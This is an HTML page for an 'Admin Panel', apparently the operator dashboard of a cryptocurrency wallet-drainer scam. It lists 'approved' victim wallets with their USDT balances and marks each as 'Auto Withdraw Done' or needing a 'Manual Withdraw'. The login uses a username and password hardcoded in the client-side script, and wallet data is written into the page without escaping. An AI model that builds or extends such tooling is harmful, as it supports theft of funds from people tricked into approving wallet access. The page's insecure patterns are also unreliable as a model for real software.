<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { background: #111; color: #fff; font-family: Arial; padding: 20px; }
    h2 { color: #00ffcc; }
    .entry { margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }
    .btn { background: #00ffcc; color: #000; padding: 5px 10px; border: none; cursor: pointer; border-radius: 5px; }
    #login { display: flex; flex-direction: column; width: 250px; margin: 100px auto; }
    input { padding: 10px; margin-bottom: 10px; border: none; border-radius: 5px; }
    #panel { display: none; }
  </style>
</head>
<body>

<div id="login">
  <h2>Admin Login</h2>
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button class="btn" onclick="checkLogin()">Login</button>
</div>

<div id="panel">
  <h2>Approved Wallets</h2>
  <div id="logArea"></div>
</div>

<script>
const LOGIN_USER = "enre.atul";
const LOGIN_PASS = "Honda988701@";

function checkLogin() {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  if (u === LOGIN_USER && p === LOGIN_PASS) {
    document.getElementById("login").style.display = "none";
    document.getElementById("panel").style.display = "block";
    loadLogs();
  } else {
    alert("Invalid login");
  }
}

const mockLogs = JSON.parse(localStorage.getItem("walletLogs") || "[]");

function loadLogs() {
  const area = document.getElementById("logArea");
  area.innerHTML = "";
  if (mockLogs.length === 0) {
    area.innerHTML = "<p>No users approved yet.</p>";
    return;
  }

  mockLogs.forEach(entry => {
    const div = document.createElement("div");
    div.className = "entry";
    div.innerHTML = `
      <b>Network:</b> ${entry.network}<br>
      <b>Wallet:</b> ${entry.address}<br>
      <b>Balance:</b> ${entry.balance} USDT<br>
      <b>Status:</b> ${entry.auto ? "Auto Withdraw Done" : "Manual Required"}<br>
      <button class="btn" onclick="manualWithdraw('${entry.network}', '${entry.address}')">Manual Withdraw</button>
    `;
    area.appendChild(div);
  });
}

function manualWithdraw(network, wallet) {
  alert("Manual Withdraw Step-by-step will be shown here.\n\nNetwork: " + network + "\nWallet: " + wallet);
}
</script>
</body>
</html>
